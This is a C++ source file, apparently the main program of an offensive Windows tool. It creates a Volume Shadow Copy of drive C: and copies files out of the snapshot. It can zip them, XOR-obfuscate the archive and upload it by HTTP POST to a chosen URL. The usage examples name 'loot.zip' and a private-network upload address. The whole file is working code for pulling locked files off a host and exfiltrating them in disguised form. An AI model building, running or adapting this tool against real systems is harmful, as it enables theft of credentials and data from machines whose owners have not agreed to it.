#include "common.h"
#include "file_utils.h"
#include "path_utils.h"
#include "privileges.h"
#include "snapshot_utils.h"
#include "zip_writer.h"
#include "upload_utils.h"

#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")

static void PrintUsage(const wchar_t *exe)
{
    fwprintf(stderr,
             L"Usage:\n"
             L"  %ls [<snapshot-relative-path> <destination>] [--keep]\n"
             L"  %ls --files <path1> [path2 ...] [--output <archive> | --post <url>] [--keep] [--xor-seed <seed>]\n"
             L"Examples:\n"
             L"  %ls\n"
             L"  %ls Users\\\\user\\\\Desktop\\\\test.txt C:\\\\test.txt\n"
             L"  %ls --files Windows\\\\test1.txt Windows\\\\test2.txt --xor-seed 1337 --output C:\\\\loot.zip\n"
             L"  %ls --files Windows\\\\test1.txt Windows\\\\test2.txt --xor-seed 1337 --post http://192.168.100.106:8000\n",
             exe, exe, exe, exe, exe, exe);
}

static int FailWithCleanup(IVssBackupComponents *vss,
                           VSS_ID snapshotId,
                           bool snapshotReady,
                           bool keepSnapshot,
                           VSS_SNAPSHOT_PROP &prop)
{
    DeleteSnapshotIfNeeded(vss, snapshotId, snapshotReady, keepSnapshot);
    VssFreeSnapshotProperties(&prop);
    if (vss)
        vss->Release();
    CoUninitialize();
    return 1;
}

int wmain(int argc, wchar_t *argv[])
{
    const wchar_t *snapshotRelative = NULL;
    const wchar_t *copyDestination = NULL;
    bool keepSnapshot = false;
    bool keepExplicit = false;
    bool multiMode = false;
    std::wstring archiveDestination;
    std::vector<std::wstring> archiveSources;
    bool xorEnabled = false;
    uint32_t xorSeed = 0;
    std::wstring postUrl;
    for (int i = 1; i < argc; ++i)
    {
        if (_wcsicmp(argv[i], L"--keep") == 0)
        {
            keepSnapshot = true;
            keepExplicit = true;
            continue;
        }

        if (_wcsicmp(argv[i], L"--xor-seed") == 0)
        {
            if (i + 1 >= argc)
            {
                PrintUsage(argv[0]);
                return 1;
            }
            ++i;
            wchar_t *endPtr = NULL;
            uint32_t seed = wcstoul(argv[i], &endPtr, 0);
            if (endPtr == argv[i])
            {
                PrintUsage(argv[0]);
                return 1;
            }
            xorEnabled = true;
            xorSeed = seed;
            continue;
        }

        if (_wcsicmp(argv[i], L"--files") == 0)
        {
            if (multiMode || snapshotRelative || copyDestination)
            {
                PrintUsage(argv[0]);
                return 1;
            }
            multiMode = true;
            while (i + 1 < argc)
            {
                const wchar_t *next = argv[i + 1];
                if (_wcsicmp(next, L"--keep") == 0 ||
                    _wcsicmp(next, L"--files") == 0 ||
                    _wcsicmp(next, L"--xor-seed") == 0 ||
                    _wcsicmp(next, L"--post") == 0 ||
                    _wcsicmp(next, L"--output") == 0)
                    break;
                archiveSources.push_back(argv[++i]);
            }
            if (archiveSources.empty())
            {
                PrintUsage(argv[0]);
                return 1;
            }
            continue;
        }

        if (_wcsicmp(argv[i], L"--output") == 0)
        {
            if (i + 1 >= argc || !archiveDestination.empty())
            {
                PrintUsage(argv[0]);
                return 1;
            }
            archiveDestination = argv[++i];
            continue;
        }

        if (_wcsicmp(argv[i], L"--post") == 0)
        {
            if (i + 1 >= argc || !postUrl.empty())
            {
                PrintUsage(argv[0]);
                return 1;
            }
            postUrl = argv[++i];
            continue;
        }

        if (!snapshotRelative)
        {
            snapshotRelative = argv[i];
        }
        else if (!copyDestination)
        {
            copyDestination = argv[i];
        }
        else
        {
            PrintUsage(argv[0]);
            return 1;
        }
    }

    if ((snapshotRelative && !copyDestination) || (!snapshotRelative && copyDestination))
    {
        PrintUsage(argv[0]);
        return 1;
    }

    if (multiMode && snapshotRelative)
    {
        PrintUsage(argv[0]);
        return 1;
    }
    if ((!postUrl.empty() || !archiveDestination.empty()) && !multiMode)
    {
        PrintUsage(argv[0]);
        return 1;
    }
    if (multiMode)
    {
        int outputs = (!archiveDestination.empty() ? 1 : 0) + (!postUrl.empty() ? 1 : 0);
        if (outputs != 1)
        {
            PrintUsage(argv[0]);
            return 1;
        }
    }

    bool singleCopy = snapshotRelative && copyDestination;
    bool multiCopy = multiMode;
    bool snapshotOnly = false;

    if (!singleCopy && !multiCopy)
    {
        snapshotOnly = true;
        if (!keepExplicit)
            keepSnapshot = true;
    }

    if (snapshotOnly)
        wprintf(L"[i] No file arguments provided; will create snapshot only\n");
    if (singleCopy)
        wprintf(L"[i] Will copy '%ls' from snapshot to '%ls'\n", snapshotRelative, copyDestination);
    if (multiCopy)
    {
        const wchar_t *note = xorEnabled ? L" (XOR stream applied)" : L"";
        if (!archiveDestination.empty())
        {
            wprintf(L"[i] Will archive %zu file(s) to '%ls'%ls\n",
                    archiveSources.size(),
                    archiveDestination.c_str(),
                    note);
        }
        else
        {
            wprintf(L"[i] Will archive %zu file(s) and upload to '%ls'%ls\n",
                    archiveSources.size(),
                    postUrl.c_str(),
                    note);
        }
    }

    if (!EnableRequiredPrivileges())
    {
        wprintf(L"[!] Could not enable required privileges\n");
        return 1;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        wprintf(L"[!] CoInitializeEx failed: 0x%08lx\n", hr);
        return 1;
    }
    wprintf(L"[+] COM initialized\n");

    hr = CoInitializeSecurity(NULL,
                              -1,
                              NULL,
                              NULL,
                              RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL,
                              EOAC_NONE | EOAC_DYNAMIC_CLOAKING,
                              NULL);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE)
    {
        wprintf(L"[!] CoInitializeSecurity failed: 0x%08lx\n", hr);
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] COM security %ls\n", hr == RPC_E_TOO_LATE ? L"already initialized" : L"initialized");

    IVssBackupComponents *vss = NULL;
    hr = CreateVssBackupComponents(&vss);
    if (FAILED(hr))
    {
        wprintf(L"[!] CreateVssBackupComponents failed: 0x%08lx\n", hr);
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] IVssBackupComponents created\n");

    hr = vss->InitializeForBackup();
    if (FAILED(hr))
    {
        wprintf(L"[!] InitializeForBackup failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Backup components initialized\n");

    hr = vss->SetContext(VSS_CTX_CLIENT_ACCESSIBLE);
    if (FAILED(hr))
    {
        wprintf(L"[!] SetContext failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] VSS context set to client-accessible\n");

    hr = vss->SetBackupState(false, false, VSS_BT_FULL, false);
    if (FAILED(hr))
    {
        wprintf(L"[!] SetBackupState failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Backup state configured (full, no writers)\n");

    VSS_ID setId = GUID_NULL, snapId = GUID_NULL;
    bool snapshotReady = false;
    hr = vss->StartSnapshotSet(&setId);
    if (FAILED(hr))
    {
        wprintf(L"[!] StartSnapshotSet failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Snapshot set created: %08lX-%04X-%04X-????\n",
            setId.Data1, setId.Data2, setId.Data3);

    hr = vss->AddToSnapshotSet((VSS_PWSZ)L"C:\\", GUID_NULL, &snapId);
    if (FAILED(hr))
    {
        wprintf(L"[!] AddToSnapshotSet failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Drive C:\\ added to snapshot set\n");

    IVssAsync *async = NULL;
    hr = vss->DoSnapshotSet(&async);
    if (FAILED(hr) || !async)
    {
        wprintf(L"[!] DoSnapshotSet failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Snapshot set creation started\n");

    hr = async->Wait();
    if (FAILED(hr))
    {
        wprintf(L"[!] Async wait failed: 0x%08lx\n", hr);
        async->Release();
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Snapshot creation completed\n");

    HRESULT hrRes = S_OK;
    async->QueryStatus(&hrRes, NULL);
    snapshotReady = true;
    async->Release();
    if (FAILED(hrRes))
    {
        DeleteSnapshotIfNeeded(vss, snapId, snapshotReady, keepSnapshot);
        wprintf(L"[!] Snapshot status failed: 0x%08lx\n", hrRes);
        vss->Release();
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] Snapshot status: 0x%08lx\n", hrRes);

    VSS_SNAPSHOT_PROP prop;
    ZeroMemory(&prop, sizeof(prop));
    hr = vss->GetSnapshotProperties(snapId, &prop);
    if (FAILED(hr))
    {
        DeleteSnapshotIfNeeded(vss, snapId, snapshotReady, keepSnapshot);
        wprintf(L"[!] GetSnapshotProperties failed: 0x%08lx\n", hr);
        vss->Release();
        CoUninitialize();
        return 1;
    }

    wprintf(L"[+] Snapshot device: %ls\n", prop.m_pwszSnapshotDeviceObject);
    std::wstring snapshotRoot = EnsureTrailingBackslash(prop.m_pwszSnapshotDeviceObject);

    if (singleCopy)
    {
        std::wstring relativeNormalized = NormalizeRelativePath(snapshotRelative);
        std::wstring fullSource;
        if (IsAbsoluteSnapshotPath(snapshotRelative))
        {
            fullSource = snapshotRelative;
        }
        else
        {
            if (relativeNormalized.empty())
            {
                wprintf(L"[!] Snapshot path must not be empty\n");
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }
            fullSource = BuildSnapshotPath(snapshotRoot, relativeNormalized);
        }

        wprintf(L"[+] Copying %ls -> %ls\n", fullSource.c_str(), copyDestination);
        if (!CopyFileW(fullSource.c_str(), copyDestination, FALSE))
        {
            DWORD err = GetLastError();
            wprintf(L"[!] CopyFile failed: %lu\n", err);
            return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
        }
        wprintf(L"[+] Copy completed\n");
    }
    else if (multiCopy)
    {
        struct ArchiveSource
        {
            std::wstring displayName;
            std::wstring fullPath;
            std::string entryName;
        };

        std::vector<ArchiveSource> tasks;
        for (const auto &rawPath : archiveSources)
        {
            if (IsAbsoluteSnapshotPath(rawPath.c_str()))
            {
                wprintf(L"[!] --files paths must be relative to the snapshot root: %ls\n", rawPath.c_str());
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }

            std::wstring normalized = NormalizeRelativePath(rawPath.c_str());
            if (normalized.empty())
            {
                wprintf(L"[!] Empty path provided for --files\n");
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }

            std::wstring fullPath = BuildSnapshotPath(snapshotRoot, normalized);
            DWORD attrs = GetFileAttributesW(fullPath.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY))
            {
                wprintf(L"[!] File not found or not a regular file: %ls\n", fullPath.c_str());
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }

            std::string entryName = MakeZipEntryName(normalized);
            if (entryName.empty())
            {
                wprintf(L"[!] Cannot archive root directory entries\n");
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }

            tasks.push_back(ArchiveSource{normalized, fullPath, entryName});
        }

        ZipWriter writer;
        std::vector<uint8_t> archiveBuffer;
        bool uploadMode = !postUrl.empty();
        if (uploadMode)
        {
            writer.OpenMemory(archiveBuffer);
        }
        else
        {
            if (!writer.Open(archiveDestination))
            {
                wprintf(L"[!] Failed to create archive %ls: %ls\n",
                        archiveDestination.c_str(),
                        writer.GetError().c_str());
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }
        }
        if (xorEnabled)
        {
            writer.EnableXor(xorSeed);
        }

        for (const auto &task : tasks)
        {
            wprintf(L"[i] Adding %ls\n", task.displayName.c_str());
            if (!writer.AddStoredFile(task.fullPath, task.entryName))
            {
                wprintf(L"[!] Failed to add %ls: %ls\n",
                        task.displayName.c_str(),
                        writer.GetError().c_str());
                std::wstring partialArchive = writer.GetTargetPath();
                writer.Close();
                DeletePartialArchive(partialArchive);
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
            }
        }

        if (!writer.Finalize())
        {
            wprintf(L"[!] Failed to finalize archive: %ls\n", writer.GetError().c_str());
            std::wstring partialArchive = writer.GetTargetPath();
            writer.Close();
            DeletePartialArchive(partialArchive);
            return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
        }

        writer.Close();
        if (xorEnabled)
            wprintf(L"[+] XOR cipher applied to archive\n");
        if (uploadMode)
        {
            wprintf(L"[i] Uploading archive to %ls\n", postUrl.c_str());
            if (!UploadArchive(archiveBuffer, postUrl, L"archive"))
                return FailWithCleanup(vss, snapId, snapshotReady, keepSnapshot, prop);
        }
        else
        {
            wprintf(L"[+] Archive written to %ls\n", archiveDestination.c_str());
        }
    }

    DeleteSnapshotIfNeeded(vss, snapId, snapshotReady, keepSnapshot);
    VssFreeSnapshotProperties(&prop);
    vss->Release();
    wprintf(L"[+] Completed successfully\n");
    CoUninitialize();
    return 0;
}
